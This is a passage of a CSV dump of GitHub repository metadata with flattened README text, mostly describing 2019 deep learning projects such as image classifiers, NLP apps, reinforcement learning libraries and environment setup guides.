facebook com utmmedium social Demystifying BERT A Comprehensive Guide to the Groundbreaking NLP Framework https www analyticsvidhya com blog 2019 09 demystifying bert groundbreaking nlp framework utmsource facebook com utmmedium social Computer Vision A curated list of awesome computer vision resources inspired by awesome php https github com jbhuang0604 awesome computer vision For a list people in computer vision listed with their academic genealogy please visit here https github com jbhuang0604 awesome computer vision blob master people md awesome deep vision A curated list of deep learning resources for computer vision inspired by awesome php and awesome computer vision https github com kjw0612 awesome deep vision Speech Recognition WER are we WER are we An attempt at tracking states of the art s and recent results on speech recognition Feel free to correct Inspired by Are we there yet https github com syhw werarewe SpeechRecognition Lib Tutorial https realpython com python speech recognition https towardsdatascience com how to build a speech recognition bot with python 81d0fe3cea9a Code https github com realpython python speech recognition Projects 30 Amazing Machine Learning Projects for the Past Year v 2018 https medium mybridge co 30 amazing machine learning projects for the past year v 2018 b853b8621ac7 experiments with google https experiments withgoogle com collection ai 30 AMAZING APPLICATIONS OF DEEP LEARNING http www yaronhadad com deep learning most amazing applications 24 Ultimate Data Science Projects To Boost Your Knowledge and Skills https www analyticsvidhya com blog 2018 05 24 ultimate data science projects to boost your knowledge and skills utmsource facebook com utmmedium social opensource google projects https opensource google projects list machine learning 8 Simple and Unique Data Science Projects to Create Art Generate Music and Much More https www analyticsvidhya com blog 2019 07 8 impressive data science projects create art music debates utmsource facebook com utmmedium social ML Regular Updates Latest research papers http www arxiv sanity com https arxiv org ML Blogs https medium com topic technology https www analyticsvidhya com deep learning papers https github com terryum awesome deep learning papers DS Content all 10 steps to become a data scientist https github com mjbahmani 10 steps to become a data scientist Applications of AI ML 10 Companies Using Machine Learning in Cool Ways https www wordstream com blog ws 2017 07 28 machine learning applications 8 Inspirational Applications of Deep Learning https machinelearningmastery com inspirational applications deep learning Online practice Python Project py files https repl it repls Jupyter Notebooks JPNB https colab research google com notebooks welcome ipynb Interview 40 Questions on Probability for data science https www analyticsvidhya com blog 2017 04 40 questions on probability for all aspiring data scientists 41 questions on Statistics for data scientists analysts https www analyticsvidhya com blog 2017 05 41 questions on statisitics data scientists analysts utmsource facebook com utmmedium social How to Build an Effective Data Science Resume https www analyticsvidhya com blog 2019 07 how to build effective data science resume 4 key aspects utmsource facebook com utmmedium social DS Interview questions The Most Comprehensive Data Science Machine Learning Interview Guide Youll Ever Need https www analyticsvidhya com blog 2018 06 comprehensive data science machine learning interview guide utmsource facebook com utmmedium social Online Test DATAMIN Unveiling the Worlds Biggest Online Data Science Quizzing Platform https medium com analytics vidhya datamin unveiling the worlds biggest online data science quizzing platform 3273ad8d28de,2019-10-01T11:12:55Z,2019-10-06T14:19:07Z,n/a,krishnamali1101,User,1,1,1,0,master,,0,0,0,0,0,0,0
himvish997,flower_recognition,n/a,Flower Recognition Deep Learning Link https www hackerearth com problem machine learning flower recognition For several years flower recognition in the wildlife has been an area of great interest among biologists Recognition of flower in environments such as forests and mountains is necessary to know whether they are extinct or not While search engines assist in searching for a flower it lacks robustness because of the intra class variation among millions of flower species The application of deep learning is rapidly growing in the field of computer vision and is helping in building powerful classification and identification models We can leverage this power of deep learning to build models that can classify and differentiate between different species of flower as well We are given a large class of flowers 102 to be precise Build a flower classification model which is discriminative between classes but can correctly classify all flower images belonging to the same class There are a total of 20549 train test images of flowers Predict the category of the flowers present in the test folder with good accuracy The data folder consists of 2 folders and 3 CSV files train Contains 18540 images from 102 categories of flowers test Contains 2009 images train csv Contains 2 columns and 18541 rows including the headers which consists of image id and the true label for each of the images in the train folder test csv Contains the image id for the images present in test folder for which the true label needs to be predicted samplesubmission csv Specifies the format for the submission file Data Description The image dataset is to be categorized into 102 classes The names of the categories are as follows in no particular order Alpine sea holly Anthurium Artichoke Azalea Ball Moss Balloon Flower Barbeton Daisy Bearded Iris Bee Balm Bird of paradise Bishop of llandaff Blackberry Lily Black eyed Susan Blanket flower Bolero deep blue Bougainvillea Bromelia Buttercup Californian Poppy Camellia Canna Lily Canterbury Bells Cape Flower Carnation Cautleya Spicata Clematis Colt s Foot Columbine Common Dandelion Corn poppy Cyclamen Daffodil Desert rose English Marigold Fire Lily Foxglove Frangipani Fritillary Garden Phlox Gaura Gazania Geranium Giant white arum lily Globe Thistle Globe flower Grape Hyacinth Great Masterwort Hard leaved pocket orchid Hibiscus Hippeastrum Japanese Anemone King Protea Lenten Rose Lotus Love in the mist Magnolia Mallow Marigold Mexican Aster Mexican Petunia Monkshood Moon Orchid Morning Glory Orange Dahlia Osteospermum Oxeye Daisy Passion Flower Pelargonium Peruvian Lily Petunia Pincushion flower Pink Primrose Pink yellow Dahlia Poinsettia Primula Prince of wales feathers Purple Coneflower Red Ginger Rose Ruby lipped Cattleya Siam Tulip Silverbush Snapdragon Spear Thistle Spring Crocus Stemless Gentian Sunflower Sweet pea Sweet William Sword Lily Thorn Apple Tiger Lily Toad Lily Tree Mallow Tree Poppy Trumpet Creeper Wallflower Water Lily Watercress Wild Pansy Windflower Yellow Iris Link to dataset https he public data s3 ap southeast 1 amazonaws com HEChallengedata zip https he public data s3 ap southeast 1 amazonaws com HEChallengedata zip Named link title,2019-09-30T07:16:37Z,2019-10-25T14:20:01Z,Python,himvish997,User,1,1,0,11,master,himvish997,1,0,0,0,0,0,0
innympinnymp,beeClassificationSVCandCNN,n/a,beeClassificationSVCandCNN Classifying bubble bee and honey bee using supervised machine learning algoriths SVM and deep learning algorithms using Convolutional Neural Nets,2019-10-22T00:35:43Z,2019-10-22T00:43:17Z,Python,innympinnymp,User,1,1,1,2,master,innympinnymp,1,0,0,0,0,0,0
neemiasbsilva,image-processing,n/a,Implementing Some Techniques of Machine Learning Using Computer Vision Details Environment If you use a Anaconda you need to install a jupyter notebook About the Implementations Bellow following some libraries do you need install 1 Matplotlib 2 Skimage 3 os 4 TensorFlow 5 Keras 6 Sklearn Sincerely Neemias B Silva,2019-09-26T02:48:46Z,2019-10-22T16:12:15Z,Jupyter Notebook,neemiasbsilva,User,1,1,0,14,master,neemiasbsilva,1,0,0,0,0,0,1
poulastyamukherjee,py_basic_ml_dl_algos,n/a,pybasicmldlalgos A repository to write codes for basic modules of machine learning and deep learning algorithms for easy understanding and explanations I love coffee and pizza and python and pytorch,2019-10-12T19:14:25Z,2019-10-13T17:08:05Z,Python,poulastyamukherjee,User,1,1,0,17,master,poulastyamukherjee,1,0,0,0,0,0,0
divapriya,WareHouse_PredictiveAnalytics,n/a,WareHousePredictiveAnalytics Using Machine Learning and Deep Learning technologies such as LSTMs AutoEncoders to predict machine failures in advance,2019-10-10T12:22:28Z,2019-10-15T13:18:32Z,Python,divapriya,User,1,1,0,2,master,divapriya,1,0,0,0,0,0,0
Hyonchori,Deep-Actor-Critic-Policy-Gradient-Architectures-Library-assorted-by-action-space,n/a,Deep Actor Critic Policy Gradient Architectures Library assorted by action space My personal deep reinforcement learning especially actor critic architectures library assorted by action space discrete or continuous stochastic or deterministic Development Env Ubuntu 18 04 PyTorch 1 3 0 GeForce RTX 2060 super Actor Type ActionSpace How to choose the aciton example Discrete Stochastic Actor discrete stochastic actionspace up down right left policy 0 1 0 2 0 5 0 2 choose sampling by policy Continuous Stochastic Actor continuous stochastic actionspace 1 1 policy mu std choose sampling by normal distribution for mu std Discrete Deterministic Actor discrete deterministic actionspace up down right left policy 3 right Continuous Deterministicc Actor continuou deterministic actionspace 1 1 policy 0 4,2019-10-30T11:47:30Z,2019-11-20T13:17:01Z,Python,Hyonchori,User,1,1,0,15,master,Hyonchori,1,0,0,0,0,0,0
0xNaN,mojito,n/a,Mojito Mojito helps to interpret the predictions of Entity Resolution classifiers You can learn more on our paper Interpreting deep learning models for entity resolution an experience report using LIME https dl acm org citation cfm id 3329859 3329878 or you can see it in action directly on Google Colab https colab research google com drive 1dR TdzF7I8qsQPLYn1oc0mvtWnB4ZoY,2019-10-06T11:01:23Z,2019-11-18T19:21:03Z,Python,0xNaN,User,1,1,0,8,master,0xNaN,1,0,0,0,0,0,0
cccccroge,NLP_application,n/a,NLP Bot An easy NLP application running on Windows using state of art deep learning models demoimage images demo png 13 func1 images genstory jpg func2 images emotionclass jpg func3 images experienceguess jpg localCPU5 Project Development Installation Windows official guide from Kivy org https kivy org doc stable installation installation windows html 1 Install Python 3 7 2 Setup pip wheel virtualenv python m pip install upgrade pip wheel setuptools virtualenv install python m virtualenv your virtual environment name create virtual env you don t need to execute this one the project already has a virtual env source your virtual environment name Scriptsactivate activate virtual env 3 Install the dependencies for Kivy python m pip install docutils pygments pypiwin32 kivydeps sdl2 0 1 22 kivydeps glew 0 1 12 4 Install Kivy python m pip install kivy 1 11 1 5 Install application associated packages python m pip install tensorflow 1 14 regex Linux official guide from Kivy org https kivy org doc stable installation installation linux html 1 Install Python 3 7 and pip sudo apt get update sudo apt get install python3 pip 2 Setup pip wheel virtualenv note that wheel in linux might run into issues python3 m pip install upgrade user pip setuptools virtualenv python3 m virtualenv yourwornvenv create virtual env at project root source yourwornvenv bin activate activate virtual env 3 Install Kivy pip3 install kivy 4 Install application associated packages pip3 install tensorflow 1 14 regex Language model setup 1 for story telling pip install gpt 2 simple 2 for emotion classification pip install bert tensorflow pip install tensorflowhub pip install pandas 3 for experience guessing pip install torch 1 3 1 torchvision 0 4 2 f https download pytorch org whl torchstable html pip install pytorchpretrainedbert pip install nltk,2019-10-05T17:02:49Z,2019-12-11T11:52:20Z,Python,cccccroge,User,1,1,0,35,master,cccccroge,1,0,0,0,0,0,0
sungyubkim,ai502-ta-session,n/a,ai502 ta session Jupyter notebook used in TA session for AI 502 Deep Learning,2019-10-02T09:20:57Z,2019-10-04T12:25:27Z,Jupyter Notebook,sungyubkim,User,1,1,1,3,master,sungyubkim,1,0,0,0,0,0,0
datvithanh,liveness,n/a,,2019-10-03T05:53:10Z,2019-11-25T10:50:51Z,Python,datvithanh,User,1,1,0,57,master,datvithanh#thanhlct,2,0,0,0,0,0,0
Kloppel,IntroMLDL,n/a,,2019-10-23T16:36:54Z,2019-12-09T15:14:21Z,Jupyter Notebook,Kloppel,User,1,1,1,12,master,Kloppel,1,0,0,0,0,0,1
pymia,CS224N,n/a,CS224N,2019-10-28T17:20:28Z,2019-10-29T00:46:45Z,n/a,pymia,User,1,1,0,1,master,pymia,1,0,0,0,0,0,0
halaSEBBAH,Cars-Model-Recognition,n/a,Cars Model Recognition a system to classify and recognise cars models using deep learning and computer vision Prerequisites pyhton OpenCv keras OverView each image is compared to logo images using SIFT in case of match we classify the image using a resnet50 model in case of negative result we classify using the global classifier also having fresnet50 architecture Step 1 Data collectionning and cleansing all data we used is in here https github com halaSEBBAH Cars Model Recognition blob master weightsdownload txt Step 2 Logo recognition using SIFT algorithm SIFT Scale invariant feature transform consists on calculating a dexcriptory vector using derivation of LoG for images in images database and recalculating the descriptory vector for request images and finding similar images using distance between vectors for details we refer this article https towardsdatascience com sift scale invariant feature transform c7233dc60f37 for the implementation we used predefined functions in OpenCv library sift cv2 xfeatures2d SIFTcreate Step 3 image recognition using deep learning and computer vision we used convolutionnal neural networks to make the classifiers as deep neural networks are aknowledged to be performant in classification tasks As the tendacy goes for making layers deeper and deeper we used ResNet50 initialy with empt weights and trained it on the data we gathered CNN model using ResNet50 architecture our models construction and training looks like this in the three Models we built imgheight imgwidth 64 64 numclasses 6 basemodel applications resnet50 ResNet50 weights None includetop False inputshape imgheight imgwidth 1 x basemodel output x GlobalAveragePooling2D x x Dropout 0 7 x predictions Dense numclasses activation softmax x model Model inputs basemodel input outputs predictions from keras optimizers import SGD Adam adam Adam lr 0 0001 model compile optimizer adam loss categoricalcrossentropy metrics accuracy model fit featuresTrain labelsTrain epochs 100 batchsize 64 why ResNet50 for details we refer this article https towardsdatascience com understanding and coding a resnet in keras 446d7ff84d33 Acknowledgments Our professor M RACHID OULAD HAJ THAMI Authors SEBBAH Hala FETTAH Taha,2019-10-18T14:05:10Z,2019-11-07T12:49:03Z,Python,halaSEBBAH,User,2,1,0,55,master,halaSEBBAH,1,0,0,0,0,0,0
Daria-cloud,CNN-model,cancer-research#immune-repertoires#machine-learning,Diagnosing Cancer from Immune Receptor Sequences Description T lymphocytes are cells of the immune system that attack and destroy virus infected cells tumor cells and cells from transplanted organs This occurs because each T cell is endowed with a highly specific receptor that can bind to an antigen present at the surface of another cell A direct detection of asymptotical early stage cancers is usually challenging due to small tumor volume and limited amount of detectable alterations in the circulation Here we developed a deep learning model based on the convolutional neural network to distinguish sequences of cancer associated T cell receptors from non cancer ones This work sets the foundation to utilize peripheral blood T cell receptor repertoire for non invasive early cancer detection First we took sequences of CDR3 regions of all studied T cell receptors TCR CDR3 regions are known to play a major role in recognition of antigens The amino acids residues of each CDR3 region were then encoded using the BLOSUM62 matrix which contains information about amino acids similarity The TCR sequences were processed with 8 convolutional filters of size 20 2 followed by maxpooling and 16 convolutional filters of size 1 2 with maxpooling The results were connected to a dense layer of 10 hidden neurons connected to the output neuron The network was trained using 25 epochs and the model with best validation accuracy was saved bestmodel h5 The model was futher validated on 10 of the data and gave AUC ROC value of 82 For a complete description of this approach see our publication to be included Requirements Python3 https www python org Keras https keras io NumPy http www numpy org Scikit learn https scikit learn org Primary Files CNNblosum py dataioblosum py Input files are stored in folder Data,2019-10-23T19:42:45Z,2019-10-23T21:31:21Z,Python,Daria-cloud,User,1,1,1,10,master,Daria-cloud,1,0,0,0,0,0,0
Joseph-Lang,Tongue-Image-Analysis,n/a,Tongue Image Analysis Use the Deep Learning Methods to mine the Tongue Images in Tradition Chinese Medicine,2019-10-30T14:09:13Z,2019-11-21T10:13:45Z,Python,Joseph-Lang,User,1,1,0,3,master,Joseph-Lang,1,0,0,0,0,0,0
parth-agrawal,DNN-Pose-Estimation,n/a,,2019-10-04T20:22:34Z,2019-12-10T00:31:51Z,Jupyter Notebook,parth-agrawal,User,1,1,0,353,master,AlexEMG#MMathisLab#parth-agrawal#sebo313#lambdaloop#katierupp#imagejan#jchutrue#cxrodgers#gkane26#jbonaiuto#alchemyconsulting#AmandineCornil#ambareeshsrja16#mrdrozdov#gdevenyi#bergem1t#michaelfsp#Mot0ka64#ObinnaMaxwell#tvajtay#billop#arnefmeyer#kanishkbjain#shaoyu6174,25,0,0,0,0,0,0
NikolasMarkou,bigbrain,deeplearning#grpc#pytorch#tensorflow,bigbrain An extendible and robust way of deploying production level deep learning models as a service I have two basic target frameworks that i want to support in mind tensorflow pytorch Dependencies I tried to use CMake best practises however if you have any trouble building please open an issue Most of the dependencies are included as submodules bash apt install zlib zlib1g dev To load all submodules bash git submodule update init recursive gflags for passing arguments glog for logging protobuf for messaging and serialization gRPC for providing RPC functionality To build in the project root bash mkdir build cd build cmake make bigbrainclient Notes Generating gRPC code To build grpcccpplugin I ve added the it as a dependency for the libbigbrain The gRPC plugin grpcccpplugin will be created in the directory BUILDDIR grpc To use it from the project s ROOTDIR bash BUILDDIR external grpc thirdparty protobuf protoc I library protos grpcout library src generated plugin protoc gen grpc build external grpc grpccppplugin library protos bigbrain proto BUILDDIR external grpc thirdparty protobuf protoc I library protos cppout library src generated library protos bigbrain proto,2019-10-07T07:27:31Z,2019-10-17T14:26:27Z,C++,NikolasMarkou,User,1,1,0,30,master,NikolasMarkou,1,0,0,0,0,0,0
manavpradhan,Emojinator,n/a,Emojinator a deep learning model that recognizes and classify different hand emojis DEMO click to watch Watch the video https img youtube com vi SpVEFF7TnXU maxresdefault jpg https youtu be SpVEFF7TnXU To make the gesture dataset make sure to create a gesture folder wherever you want and change the path in the emoji py wherever necessary run emoji py When you see the frame and thresh screen press c and show your hand gesture only 1 gesture in front of webcam it will start capturing until count 1200 you can see on screen the program will quit continue the above steps for how many ever gestures you want in my code 11 gestures this code will create a gesture dataset with different hand gestures convert gesture folder to csv for training the model run createCSV py this code will create a csv file named trainfoo csv training the model run trainEmoji py this code will train the model and create the weight file emojinator h5 Emojinator run emojinator py this code will predict your hand gestures according to the dataset provided,2019-10-27T17:43:15Z,2019-10-29T17:28:44Z,Python,manavpradhan,User,1,1,0,12,master,manavpradhan,1,0,0,0,0,0,0
abenbihi,tf_land,n/a,Where all networks get tensorflowed Models Netvlad Hed DeepGaze SuperPoint VGG AlexNet CaseNet ongoing,2019-10-26T15:06:22Z,2019-11-26T01:54:52Z,Python,abenbihi,User,1,1,0,7,master,abenbihi,1,0,0,0,0,2,0
Hdooster,unlearning,n/a,Keras implementation of gradient reversal for debiasing unlearning metadata from a dataset,2019-09-30T12:29:36Z,2019-10-23T13:47:42Z,Jupyter Notebook,Hdooster,User,1,1,0,1,master,Hdooster,1,0,0,0,0,0,0
ravi-1654003,LSTM-DonorsChoose,n/a,We will use Deep Learning to analyse text data LSTM Long Term Short Memory is one of the type of RNN Recurrent Neural Network which preserve sequence information and help to analyse text data,2019-09-25T06:57:06Z,2019-11-13T17:50:35Z,Jupyter Notebook,ravi-1654003,User,1,1,0,4,master,ravi-1654003,1,0,0,0,0,0,0
shashankprasanna,using-containers-for-dl,n/a,This repository contains code supporting my AWS Tech Talk titled Using Containers for Deep Learning Workflows https pages awscloud com AWS Online Tech Talks20190914 MCL html On demand video on Youtube https www youtube com watch v wbDVGAbddM Slides https www slideshare net shashank4 aws tech talk using containers for deep learning workflows,2019-09-30T19:11:22Z,2019-10-15T23:52:11Z,Python,shashankprasanna,User,1,1,0,2,master,shashankprasanna,1,0,0,0,0,0,0
mrkolarik,conferences,n/a,conferences This repository contains list of some selected 2020 conferences in deep learning computer vision and possibly biomedical imaging with deadlines for the standard paper submission The list was created 10th October 2019 and if there were not published deadlines I did estimate them from year 2019 Good source is here http www guide2research com topconf computer vision Conference name Abbreviation Date Where Paper deadline Ranking Qualis IEEE Conference on Computer Vision and Pattern Recognition CVPR 16th 20th June 2020 Seattle Washington November 15 2019 A1 International Conference on Machine Learning ICML 12th 18th July 2020 Wien Austria Jan 31 2020 A1 Neural Information Processing Systems NeurIPS December 2020 Estimate Canada May 2020 A1 International Conference on Computational Vision ICCV June 22 23 2020 Venice Italy March 2020 A1 British Machine Vision Conference BMVC September 2020 UK April 2020 A2 IEEE International Conference on Image Processing ICIP October 25 28 2020 Abu Dhabi UAE January 31 2020 A1 International Conference on Pattern Recognition ICPR 13 18 Sep 2020 Milan Italy March 2 2020 A1 European Signal Processing Conference EUSIPCO 24 28 August 2020 Amsterdam Netherlands February 21 2020 B1 International Conference on Biometrics ICB September 27 30 2020 Houston USA December 9 2019 B2 European Conference on Artificial Intelligence ECAI June 8 12 2020 Santiago de Compostella Spain Nov 15 2019 Abstract A2 European Conference on Computer Vision ECCV August 23 28 2020 Glasgow Scotland UK March 2020 A1 IEEE International Conference on Machine Learning and Applications ICMLA June 11 12 2020 Copenhagen Denmark October 15 2019 B2 International Conference on Medical Image Computing and Computer Assisted Intervention MICCAI Oct 4 8 2020 Lima Peru March 2020 Estimate A1 Thirty Fourth AAAI Conference on Artificial Intelligence AAAI 20 AAAI February 7 12 2020 Hilton New York Midtown New York USA August 30 2019 A1,2019-10-10T16:56:50Z,2019-11-29T13:20:19Z,n/a,mrkolarik,User,0,1,0,9,master,mrkolarik,1,0,0,0,0,0,0
yeliu918,QREFINE-PPO,n/a,QREFINE PPO This is implementation of QREFINE model described in Generative Question Refinement with Deep Reinforcement Learning in Retrieval based QA System https arxiv org abs 1908 05604 Datasets Yahoo dataset https ciir cs umass edu downloads nfL6 Customer Service Userlog CSU data Huawei largeunique0 95withoutalluserlog Rewards network Wording Reward BASeq2Seq py Answer Coherency Reward QAsimiliarity py Baselines Seq2Seq and Seq2Seq Attention and Seq2Seq Bidirectional BASeq2Seq py QREFINEsen SenseqRLtraining py QREFINEword WordseqRLtraining py QREFINE WholeseqRLtraining py Question Answer Retrieval experiment Retrieveqa py Evaluation Bleu 1 2 3 4 EvaluationPackage bleu Meteor EvaluationPackage meteor Rouge EvaluationPackage rouge,2019-10-08T23:29:51Z,2019-11-19T06:28:15Z,Python,yeliu918,User,2,1,1,8,master,yeliu918,1,0,0,1,0,0,0
sebderhy,Derotate,n/a,Derotate Web App API that understands if how an image is rotated and derotates it built with fastai v1 library https docs fast ai and using fastai course https course fast ai It can be tested here https derotate appspot com Motivation When I take pictures with my phone the auto rotate feature often doesn t work properly and my pictures end up having the bad orientation This is of course an issue afterwards when looking at the pictures but more importantly the fact that different images can get different orientations is an important issue when building an automated image processing computer vision pipelines For example if you use a phone as a dashcam the images may have different orientation depending on how the user sets up his phone Example For example if you give the model the following image imginput https github com sebderhy derotate blob master testimages imgtestrotated270 jpg Rotated image Then the resulting image is imgoutput https github com sebderhy derotate blob master testimages imgtest jpg Derotated image How does it work 1 A Deep Neural Network classifier is trained to recognize if an image is rotated 90 180 270 or straight 2 The image is then derotated using PIL library Model training The Notebook responsible for model training is training isImgRotated https github com sebderhy derotate blob master training isImgRotated ipynb In order to train the model we download the Imagenette https github com fastai imagenette dataset rotate the images and train a model DenseNet121 to recognize if how an image is rotated Deployment The web app that does the inference is based on the Google App Engine starter pack available here https github com fastai course v3 raw master docs production google app engine zip using Starlette io framework with Uvicorn ASGI server One notable difference compared to the starter web app is that this one also displays back the derotated model The web app code could therefore be useful also for semantic segmentation super resolution etc Everything is packaged in a docker with requirement txt so you can push it to any docker hosted cloud service imgwebapp https github com sebderhy derotate blob master testimages derotatecapture PNG Webapp Screenshot,2019-10-20T21:05:05Z,2019-11-02T12:03:10Z,Jupyter Notebook,sebderhy,User,1,1,0,12,master,sebderhy,1,0,0,0,0,0,0
PalashDumbare,PredictCelebrityNames,5-celebrity-faces-dataset#imageclassification#resnet-50,,2019-10-28T11:29:42Z,2019-10-28T12:04:52Z,Jupyter Notebook,PalashDumbare,User,1,1,0,6,master,PalashDumbare,1,0,0,0,0,0,0
Robin-ML,Actor-Critic-Methods,a2c#advantage-actor-critic#reinforcement-learning,Advantage Actor Critic Model applied to OpenAI environment CartPole Actor critic methods combine policy gradient methods with a learned value function Policy gradient methods tend to learn slowly produce estimates of high variance and to be inconvenient to implement online or for continuing problems In order to eliminate these inconveniences we can implement various form of bootstrapping In this case of policy gradient methods we use actorcritic methods with a bootstrapping critic The Advantage Actor Critic has two main variants the Asynchronous Advantage Actor Critic A3C and the Advantage Actor Critic A2C Implementation The idea of a policy is to parametrise the action probability distribution given some input state We do so by creating a network that takes the state of the game and decides what we should do As such while the agent is playing the game whenever it sees a certain state or similar states it will compute the probability of each available action given an input state and then sample an action according to this probability distribution To delve into the mathematics more formally policy gradients are a special case of the more general score function gradient estimator The general case is expressed in the form of Ex p x f x in other words and in our case the expectation of our reward or advantage function f under some policy network p Then using the log derivative trick we figure out how to update our networks parameters such that the action samples obtain higher rewards and end up with Ex f x Ex f x log p x In English this equation explains how shifting in the direction of our gradient will maximize our scores according to our reward function f,2019-09-29T12:33:02Z,2019-09-29T19:05:47Z,Python,Robin-ML,User,1,1,0,16,master,Robin-ML,1,0,0,0,0,0,0
nani67,SportsAnalytics_ML_DL,n/a,,2019-10-26T08:17:00Z,2019-12-09T14:47:44Z,Python,nani67,User,1,1,0,2,master,nani67,1,0,0,0,0,0,0
khanhnamle1994,transfer-rec,n/a,TransferRec Codebase for my Master s Thesis work on Deep Learning Based Recommendation Systems,2019-09-26T20:42:39Z,2019-12-13T00:41:19Z,Python,khanhnamle1994,User,2,1,0,95,master,khanhnamle1994,1,0,0,0,0,0,0
gevaertlab,LungNet,n/a,,2019-09-20T01:22:51Z,2019-10-21T16:18:39Z,Python,gevaertlab,Organization,6,1,0,1,master,pritammu,1,0,0,0,0,0,0
purelyvivid,numpy-GraphNN,graphneuralnetwork#numpy,,2019-09-20T04:42:29Z,2019-10-25T03:39:30Z,Jupyter Notebook,purelyvivid,User,1,1,0,5,master,purelyvivid,1,0,0,0,0,0,0
ZsoltFischer,DL_Homework_KorszeruGepeszek,n/a,Deep Learning Homework Korszer Gpszek Homework repository of team Korszeru Gepeszek for deep learning course BMEVITMAV45 2019 20 1 The project is carried out in Google Colaboratory using Python 3 7 DeepLearningDocumentation pdf contains the full documentation of the project Talker separation problem The aim of our homework is to create a network that is capable of separating the speech of two speakers who speak simultanously The method of recording is presumed to be single channeled mono monaural Data sets The data source is the audiobook form of the Charles Dickens novel Hard Times read by ten different speakers To create input data we split and mix these signals on top of each other Dependencies tensorflow for the model using tensorflow 1 x librosa soundfile for audio processing h5py for saving the generated dataset in HDF5 format mireval for SDR calculation Results Output samples can be found in the modelexampleoutputs folder,2019-10-15T14:38:36Z,2019-12-13T17:25:40Z,Jupyter Notebook,ZsoltFischer,User,1,1,1,30,master,takd#Besi97#ZsoltFischer,3,0,0,0,0,0,2
Matthew-Daly,sarcasm_detection_using_nlp,n/a,sarcasmdetectionusing nlp,2019-10-15T17:11:24Z,2019-10-19T12:08:22Z,Jupyter Notebook,Matthew-Daly,User,1,1,0,1,master,Matthew-Daly,1,0,0,1,0,1,0
ahassanzadeh,RoboGym,n/a,RoboGym A Virtual Training Gym for Autonomous Vehicle using Deep Reinforcement Learning You can find the presentation sildes here https docs google com presentation d 1V8KX64MdBqVPu6P0uukhF9grdG7qMSG2hCiIBCJgtTI edit slide id g649c3cfac82127 Requirements The RoboGym package works on Linux Mac and Windows Use the following instruction to install the required packages and start the training In the terminal First create and activate conda virtual environment as conda create n RoboGym python 3 6 conda activate RoboGym Secondly in directory Packages use following command pip install e Third in directory Robogymtraining animalaitrain use the following command pip install e Finally download the environment for your system OS Environment link Linux download v1 0 0 https drive google com drive u 0 folders 1D9zrjEp6Z2azDcy4FcOQmr0L l8e4dhS MacOS download v1 0 0 https drive google com drive u 0 folders 1gcBqT9 5m0STPPncCkz1gDbeQdZ693Wm Windows download v1 0 0 https drive google com drive u 0 folders 18KtalJTbPaTXmUyBAqIl4w8wTzYf8hm You can now unzip the content of the archive to the RoboGym Env folder and you re ready to go Make sure the executable RoboGym is in RoboGym Env On linux you may have to make the file executable by running chmod x env RoboGym x8664 Then you can simply start training on your local machine running following command sh cd RoboGym RoboGymtraining python RoboGym py Training on Amazon Web Service This section is a summary of practical sections from here https github com Unity Technologies ml agents blob master docs Training on Amazon Web Service md This page contains instructions for setting up an EC2 instance using deep learning AMI https aws amazon com marketplace pp Amazon Web Services Deep Learning AMI with Source B01M0AXXQB on Amazon Web Service for training ML Agents environments Install and setup Xorg sh Install Xorg sudo apt get update sudo apt get install y xserver xorg mesa utils sudo nvidia xconfig a use display device None virtual 1280x1024 Get the BusID information nvidia xconfig query gpu info Add the BusID information to your etc X11 xorg conf file sudo sed i s BoardName Tesla K80 BoardName Tesla K80 n BusID 0 30 0 g etc X11 xorg conf Remove the Section Files from the etc X11 xorg conf file And remove two lines that contain Section Files and EndSection sudo vim etc X11 xorg conf Update and setup Nvidia driver sh Download and install the latest Nvidia driver for ubuntu Please refer to http download nvidia com XFree86 Linux x8664 latest txt wget http download nvidia com XFree86 Linux x8664 390 87 NVIDIA Linux x8664 390 87 run sudo bin bash NVIDIA Linux x8664 390 67 run accept license no questions ui none Disable Nouveau as it will clash with the Nvidia driver sudo echo blacklist nouveau sudo tee a etc modprobe d blacklist conf sudo echo options nouveau modeset 0 sudo tee a etc modprobe d blacklist conf sudo echo options nouveau modeset 0 sudo tee a etc modprobe d nouveau kms conf sudo update initramfs u Restart the EC2 instance sh sudo reboot now Make sure there are no Xorg processes running sh Kill any possible running Xorg processes Note that you might have to run this command multiple times depending on how Xorg is configured sudo killall Xorg Check if there is any Xorg process left You will have a list of processes running on the GPU Xorg should not be in the list as shown below nvidia smi Thu Jun 14 20 21 11 2018 NVIDIA SMI 390 67 Driver Version 390 67 GPU Name Persistence M Bus Id Disp A Volatile Uncorr ECC Fan Temp Perf Pwr Usage Cap Memory Usage GPU Util Compute M 0 Tesla K80 On 00000000 00 1E 0 Off 0 N A 37C P8 31W 149W 0MiB 11441MiB 0 Default Processes GPU Memory GPU PID Type Process name Usage No running processes found Start X Server and make the ubuntu use X Server for display console Start the X Server press Enter to come back to the command line sudo usr bin X 0 Check if Xorg process is running You will have a list of processes running on the GPU Xorg should be in the list nvidia smi Make the ubuntu use X Server for display export DISPLAY 0 Ensure the Xorg is correctly configured sh For more information on glxgears see ftp www x org pub X11R6 8 1 doc glxgears 1 html glxgears If Xorg is configured correctly you should see the following message Running synchronized to the vertical refresh The framerate should be approximately the same as the monitor refresh rate 137296 frames in 5 0 seconds 27459 053 FPS 141674 frames in 5 0 seconds 28334 779 FPS 141490 frames in 5 0 seconds 28297 875 FPS Training on EC2 instance 1 In the Unity Editor load a env project env you can also use my built enviroment for mac linux or Windows and go directly to step 6 2 Open the Build Settings window menu File Build Settings 3 Select Linux as the Target Platform and x8664 as the target architecture the default x86 currently does not work 4 Check Headless Mode if you have not setup the X Server If you do not use Headless Mode you have to setup the X Server to enable training 5 Click Build to build the Unity environment executable 6 Upload the executable to your EC2 instance within Env folder 7 Change the permissions of the executable sh chmod x x8664 8 Without Headless Mode Start X Server and use it for display sh Start the X Server press Enter to come back to the command line sudo usr bin X 0 Check if Xorg process is running You will have a list of processes running on the GPU Xorg should be in the list nvidia smi Make the ubuntu use X Server for display export DISPLAY 0 9 Run Python file sh cd RoboGym RoboGymtraining python RoboGym py,2019-10-15T21:57:11Z,2019-11-04T17:50:38Z,C#,ahassanzadeh,User,1,1,1,34,master,ahassanzadeh,1,0,0,0,1,1,0
